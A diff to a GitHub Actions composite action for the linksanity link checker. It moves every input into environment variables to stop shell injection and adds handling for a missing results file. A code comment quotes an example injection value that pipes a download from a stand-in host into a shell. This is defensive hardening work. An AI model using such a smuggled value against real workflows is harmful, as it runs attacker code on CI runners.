@@ -54,9 +54,13 @@ runs:
 
     - name: Install linksanity
       shell: bash
+      # Inputs go through env, never `${{ }}` interpolation into the script body:
+      # a value like `x"; curl evil.sh | sh; :"` would otherwise execute.
+      env:
+        VERSION: ${{ inputs.version }}
       run: |
-        if [ -n "${{ inputs.version }}" ]; then
-          pip install "linksanity==${{ inputs.version }}"
+        if [ -n "$VERSION" ]; then
+          pip install "linksanity==$VERSION"
         else
           pip install "linksanity"
         fi
@@ -64,28 +68,45 @@ runs:
     - name: Run scan
       id: scan
       shell: bash
+      env:
+        PATHS: ${{ inputs.paths }}
+        CHECK_ANCHORS: ${{ inputs.check-anchors }}
+        SKIP_URLS: ${{ inputs.skip-urls }}
+        OUTPUT: ${{ inputs.output }}
+        EXTRA_ARGS: ${{ inputs.args }}
       run: |
         flags=""
-        if [ "${{ inputs.check-anchors }}" = "true" ]; then
+        if [ "$CHECK_ANCHORS" = "true" ]; then
           flags="$flags --check-anchors"
         fi
-        if [ -n "${{ inputs.skip-urls }}" ]; then
+        if [ -n "$SKIP_URLS" ]; then
           skip_file=$(mktemp)
           set -f
-          printf '%s\n' ${{ inputs.skip-urls }} > "$skip_file"
+          printf '%s\n' $SKIP_URLS > "$skip_file"
           set +f
           flags="$flags --skip-urls $skip_file"
         fi
 
         set +e
-        linksanity scan ${{ inputs.paths }} --format json --output "${{ inputs.output }}" $flags ${{ inputs.args }}
+        # $PATHS, $flags and $EXTRA_ARGS are deliberately unquoted: all three are
+        # space-separated lists that must word-split into separate argv entries.
+        linksanity scan $PATHS --format json --output "$OUTPUT" $flags $EXTRA_ARGS
         code=$?
         set -e
 
-        broken_count=$(jq '[.[] | select(.status=="broken" or .status=="error")] | length' "${{ inputs.output }}")
+        # linksanity only writes the results file once it reaches the reporting
+        # stage. Any early exit (unknown flag, unreadable config, missing
+        # Playwright) leaves no file, so jq must not be allowed to fail here --
+        # it would mask the real error and leave both outputs unset.
+        broken_count=0
+        if [ -f "$OUTPUT" ]; then
+          broken_count=$(jq '[.[] | select(.status=="broken" or .status=="error")] | length' "$OUTPUT" 2>/dev/null || echo 0)
+        else
+          echo "::warning::linksanity exited $code without writing $OUTPUT; reporting broken-count=0. Check the scan step log above for the underlying error."
+        fi
 
         echo "broken-count=$broken_count" >> "$GITHUB_OUTPUT"
-        echo "results-file=${{ inputs.output }}" >> "$GITHUB_OUTPUT"
+        echo "results-file=$OUTPUT" >> "$GITHUB_OUTPUT"
 
         exit $code
 
